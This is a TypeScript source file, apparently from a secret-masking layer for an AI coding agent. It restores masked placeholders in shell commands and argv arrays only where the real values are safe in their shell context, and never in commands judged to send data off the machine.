/** The body's end (start of the closing line) and where shell code
 * resumes (the newline after it), or `undefined` when there is none. */
function findClosingLine(
  command: string,
  start: number,
  heredoc: Heredoc,
): { bodyEnd: number; next: number } | undefined {
  if (heredoc.delimiter === undefined) return undefined;
  let lineStart = start;
  while (lineStart <= command.length) {
    const newline = command.indexOf('\n', lineStart);
    const lineEnd = newline === -1 ? command.length : newline;
    const line = command.slice(lineStart, lineEnd);
    const candidate = heredoc.stripTabs ? line.replace(LEADING_TABS, '') : line;
    if (candidate === heredoc.delimiter) return { bodyEnd: lineStart, next: lineEnd };
    if (newline === -1) return undefined;
    lineStart = newline + 1;
  }
  return undefined;
}

/** A shell command with its safe placeholders restored. */
export interface ShellRestore {
  readonly command: string;
  /** One result per placeholder restored, or found unknown or foreign
   * (left literal, and counted as such by the caller). */
  readonly results: readonly RestoreResult[];
  /** The placeholders left literal because their value was not safe
   * where they stand, once per occurrence. Placeholders, never values. */
  readonly keptMasked: readonly string[];
}

/**
 * Restore the placeholders in a shell `command`, each only when its real
 * value is safe in the context at its position (`shellContextAt`), and
 * none in a command that sends data off the machine (`sendsOffMachine`).
 * The command is read once, as received: a value restored there never
 * ends its quoting or its heredoc, so it cannot change the context of a
 * later placeholder.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellCommand(
  np: RestoreCapable,
  command: string,
  sessionId: string,
): ShellRestore {
  const starts = [...command.matchAll(placeholderPattern())].map((m) => m.index);
  const verdict = judge(command, starts);
  return restoreEach(np, command, sessionId, (value, at) =>
    verdict.offMachine ? false : shellSafe(value, verdict.contextAt.get(at) ?? 'none'),
  );
}

/** A shell `command` given as an argv array, with its safe placeholders
 * restored. */
export interface ShellArgvRestore {
  readonly argv: readonly string[];
  readonly results: readonly RestoreResult[];
  readonly keptMasked: readonly string[];
}

/**
 * Restore the placeholders of a `command` given as an argv array, as
 * Codex's `shell` tool sends it (`["bash", "-lc", "…"]`). The program
 * runs without a shell, so each argument is taken literally and a value
 * needs only to be inert (the program may still read it again), unless:
 * - the program sends data off the machine, or runs code that may: nothing
 *   is restored;
 * - the program runs code (`bash -lc`, `python3`, `xargs`, also behind a
 *   wrapper or a path), or an argument hands code to an interpreter: every
 *   argument gets the strictest rule, as in a string command;
 * - the value would be the program itself, or start an argument with `-`,
 *   where it would be read as an option: the strictest rule.
 *
 * @param np - the engine whose vault holds `sessionId`.
 */
export function restoreShellArgv(
  np: RestoreCapable,
  argv: readonly string[],
  sessionId: string,
): ShellArgvRestore {
  const offline = !argvSendsOffMachine(argv);
  const code = argvRunsCode(argv);
  const results: RestoreResult[] = [];
  const keptMasked: string[] = [];
  const restored = argv.map((word, position) => {
    const r = restoreEach(np, word, sessionId, (value, at) => {
      if (!offline) return false;
      if (code || position === 0) return shellSafe(value, 'none');
      return (at > 0 || !value.startsWith('-')) && SHELL_INERT.test(value);
    });
    results.push(...r.results);
    keptMasked.push(...r.keptMasked);
    return r.command;
  });
  return { argv: restored, results, keptMasked };
}

/** The program an argv array runs, every word literal. */
function argvProgram(argv: readonly string[]): Program | undefined {
  return programOf(argv.map((text) => ({ text, computed: false })));
}

function argvRunsCode(argv: readonly string[]): boolean {
  const program = argvProgram(argv);
  return (
    (program !== undefined && runsCode(program)) || argv.some((a) => NESTED_INTERPRETER.test(a))
  );
}

/** True when an argv command sends data out: its program does, an
 * argument names a network client, or it runs code (each argument then
 * read as a shell command) that does. */
function argvSendsOffMachine(argv: readonly string[]): boolean {
  const program = argvProgram(argv);
  if (program !== undefined && sendsOut(program)) return true;
  if (argv.some((a) => NETWORK_CLIENT.test(a))) return true;
  if (!argvRunsCode(argv)) return false;
  return argv.some((a) => NETWORK_IN_CODE.test(a) || sendsOffMachine(a));
}

/** Restore each placeholder of `text` whose real value `safe` accepts at
 * the placeholder's index; leave the others literal. */
function restoreEach(
  np: RestoreCapable,
  text: string,
  sessionId: string,
  safe: (value: string, at: number) => boolean,
): ShellRestore {
  const results: RestoreResult[] = [];
  const keptMasked: string[] = [];
  let out = '';
  let last = 0;
  for (const match of text.matchAll(placeholderPattern())) {
    const start = match.index;
    const placeholder = match[0];
    const r = np.restore(placeholder, sessionId);
    const ok = r.replacements === 0 || safe(r.restored, start);
    if (ok) results.push(r);
    else keptMasked.push(placeholder);
    out += text.slice(last, start) + (ok ? r.restored : placeholder);
    last = start + placeholder.length;
  }
  return { command: out + text.slice(last), results, keptMasked };
}

/** How many placeholders `text` holds. */
export function countPlaceholders(text: string): number {
  return placeholdersIn(text).length;
}

/** The placeholders `text` holds, in order, once per occurrence. */
export function placeholdersIn(text: string): string[] {
  return [...text.matchAll(placeholderPattern())].map((m) => m[0]);
}

/** A fresh global copy: `matchAll` needs the `g` flag, and a shared
 * global regex would carry `lastIndex` between callers. */
function placeholderPattern(): RegExp {
  return new RegExp(PLACEHOLDER_REGEX.source, 'g');
}
